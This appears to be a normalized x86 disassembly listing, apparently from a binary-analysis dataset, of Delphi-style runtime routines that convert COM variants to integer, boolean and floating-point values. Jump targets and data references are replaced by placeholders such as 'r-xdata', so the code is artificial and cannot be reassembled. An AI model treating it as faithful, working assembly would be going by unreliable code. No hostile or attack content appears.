mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40eea8
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410cc4
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_410610
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410667
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f574
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4106c8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41066e
lea eax [ ebp - 0x18 ]
call sub_40f24c
retn
sub_41067c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414760
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4106c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410ad4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4106fb ]
mov eax [ ebp - 0x4 ]
call sub_410510
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410510
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4106c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410464
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410610
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40ea14
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41067c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410464
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410464
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41091f ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410510
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4106c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410b0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410bc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412c8c
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404334
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408524
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410bca
lea eax [ ebp - 0x10 ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_4047b8
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40eea8
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40eea8
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410bd4
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40eea8
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410c14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410c68
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f574
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410cc4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c6f
lea eax [ ebp - 0x11 ]
call sub_40f24c
retn
sub_410c78
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414760
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410cc4
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410cde ]
mov eax ebx
call sub_410b0c
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410b0c
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410cc4
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410bd4
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410c14
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40ea14
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410c78
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410bd4
mov [ esp ] al
mov eax ebx
call sub_410bd4
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410ea0 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410b0c
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410cc4
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_411018
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4110cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c8c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404334
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409770
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40eea8
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40eea8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4110d4
lea eax [ ebp - 0x1c ]
call sub_4040ac
lea eax [ ebp - 0xc ]
call sub_4047b8
retn
sub_4110dc
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40eea8
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411128
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41117d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f574
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4111d8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411184
lea eax [ ebp - 0x18 ]
call sub_40f24c
retn
sub_41118c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414760
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4111d8
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4111f4 ]
mov eax ebx
call sub_411018
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411018
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4111d8
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4110dc
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411128
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40ea14
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41118c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4110dc
fstp [ esp ]
fwait
mov eax ebx
call sub_4110dc
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4113d1 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411018
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4111d8
fstp [ esp ]
fwait
jmp r-xdata
sub_411570
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_4116d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4111d8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_411592 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40ea14
sub_411700
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4117dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c8c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404334
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b1ac
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4117e3
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0xc ]
call sub_4047b8
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404334
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_40978c
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40eea8
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40eea8
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_4117ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40eea8
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41184c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40eea8
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411898
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4118ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f574
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411948
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4118f4
lea eax [ ebp - 0x18 ]
call sub_40f24c
retn
sub_4118fc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414760
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411948
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
